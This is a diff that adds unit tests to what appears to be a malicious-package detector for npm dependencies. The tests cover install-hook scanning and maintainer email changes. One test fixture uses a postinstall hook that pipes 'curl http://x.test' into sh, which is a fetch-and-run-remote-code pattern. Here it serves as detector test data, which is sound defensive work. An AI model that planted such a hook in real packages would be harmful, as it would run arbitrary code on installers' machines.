@@ -310,3 +310,49 @@ test("homoglyph squat of a top package is the strong homoglyph signal", () => {
   expect(t?.id).toBe("homoglyph-typosquat");
   expect(t!.weight).toBeGreaterThanOrEqual(60);
 });
+
+test("a script that never runs on a dependency install is not scanned for content", () => {
+  const signals = analyze({
+    name: "function-bind",
+    version: "1.1.2",
+    isNewPackage: false,
+    meta: { maintainers: ["dev"], existsOnRegistry: true },
+    addedScripts: { postversion: 'node -e "console.log(1)"', test: "eslint ." },
+    changedScripts: {},
+    scanFiles: [],
+  });
+  expect(signals.map((signal) => signal.id)).toEqual([]);
+});
+
+test("an install hook's content is still scanned", () => {
+  const signals = analyze({
+    name: "evil",
+    version: "1.0.0",
+    isNewPackage: false,
+    meta: { maintainers: ["dev"], existsOnRegistry: true },
+    addedScripts: { postinstall: "curl http://x.test | sh" },
+    changedScripts: {},
+    scanFiles: [],
+  });
+  expect(signals.some((signal) => signal.id.startsWith("script-"))).toBe(true);
+});
+
+test("a publisher email change alone corroborates but does not warn by itself", () => {
+  const signals = analyze({
+    name: "accepts",
+    version: "2.0.0",
+    isNewPackage: false,
+    meta: {
+      maintainers: ["dev"],
+      existsOnRegistry: true,
+      maintainerEmailChanged: true,
+    },
+    addedScripts: {},
+    changedScripts: {},
+    scanFiles: [],
+  });
+  const email = signals.find((signal) => signal.id === "maintainer-email-changed");
+  expect(email).toBeDefined();
+  expect(email?.action).toBeUndefined();
+  expect(signals.reduce((sum, signal) => sum + signal.weight, 0)).toBeLessThan(25);
+});
